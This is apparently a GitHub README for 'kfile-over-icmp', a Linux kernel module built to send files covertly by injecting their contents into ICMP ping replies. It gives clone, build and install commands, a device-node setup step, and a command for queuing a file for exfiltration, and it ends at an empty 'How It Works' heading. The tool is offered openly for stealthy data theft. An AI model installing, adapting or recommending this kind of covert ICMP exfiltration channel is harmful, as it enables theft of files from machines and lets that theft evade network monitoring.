# __kfile-over-icmp__

> **Note**: This LKM was developed using linux kernel version *4.4.10* and *4.98.13*. Should you have problems compiling this module, please check for your kernel version first.

_kfile-over-icmp_ is a loadable kernel module for stealth sending of files over ICMP communication.

## __Usage__
```sh
$ git clone https://github.com/spiderpig1297/kfile-over-icmp.git
$ cd kfile-over-icmp
$ make
$ make install
```

Once installed, the module registers a character device from which it gets the paths of the files.
Run `dmesg` to retrieve the major number of the device, and then create a node to it using `mknod`.

```sh
$ dmesg | tail

[15132.935862] kfile-over-icmp: LKM loaded
[15132.935864] kfile-over-icmp: registered netfilter hook
[15132.935867] kfile-over-icmp: succesfully registered character device. major: 243

$ mknod /dev/readfile c <MAJOR_GOES_HERE> 0
```

In order to send a file over ICMP, write its (absolute!) path to our newly-created device.

```sh
$ echo "/file/to/send/ > /dev/readfile
```

__From now on, once an ICMP-request (ping) packet will reach the machine, the module will inject the file's data on the ICMP-reply packet.__

For more information, see (How It Works)[#how-it-works]

To uninstall the module, run:

```sh
$ make remove
```

## __How It Works__